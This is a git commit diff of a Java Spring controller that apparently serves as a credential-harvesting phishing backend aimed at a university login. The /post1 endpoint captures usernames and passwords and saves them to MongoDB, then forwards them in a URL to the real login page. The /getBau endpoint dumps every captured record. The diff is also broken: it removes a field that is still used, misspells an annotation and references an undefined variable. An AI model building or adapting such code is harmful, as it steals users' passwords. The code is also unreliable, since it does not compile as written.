9901280ae91d819a3ea5cb2146a34367d4b0ea6b
baraa95 <mrbaraa8@gmail.com>
2017-01-20 22:03:27 +0200

    Update BAU.java

--- src/main/java/com/example/BAU.java
+++ src/main/java/com/example/BAU.java
@@ -4,30 +4,38 @@ import org.springframework.stereotype.Controller;
 import org.springframework.web.bind.annotation.RequestMapping;
 import org.springframework.web.bind.annotation.RequestParam;
 import org.springframework.web.bind.annotation.ResponseBody;
+import org.springframework.beans.factory.annotation.Autowired;
+import org.springframework.data.repository.CrudRepository;
 
 import java.util.ArrayList;
 
 /**
  * Created by baraa on 1/18/2017.
  */
+interface MongoRepo extends CrudRepository <User, Long> {
+		
+			User findByFirstName (String name);
+}
 
 @Controller
 public class BAU {
 
-    static ArrayList<String> list = new ArrayList<>();
 
+    @AutoWired
+    MongoRepo mongo;
 
     @RequestMapping("/post1")
     public String s(@RequestParam("username") String userName, @RequestParam("password") String password) {
         list.add("The userName is : " + userName + " and  Your Password is  " + password);
+        mongo.save(new User(username,password));
         return "redirect:http://app2.bau.edu.jo:7777/reg_new/actions/login?username=" + userName + "&password=" + password;
     }
 
     @RequestMapping("/getBau")
     @ResponseBody
-    public ArrayList list()
+    public  Iterable<User> list()
     {
-        return list;
+        return mongo.findAll();
     }
 
     @RequestMapping("/bau")
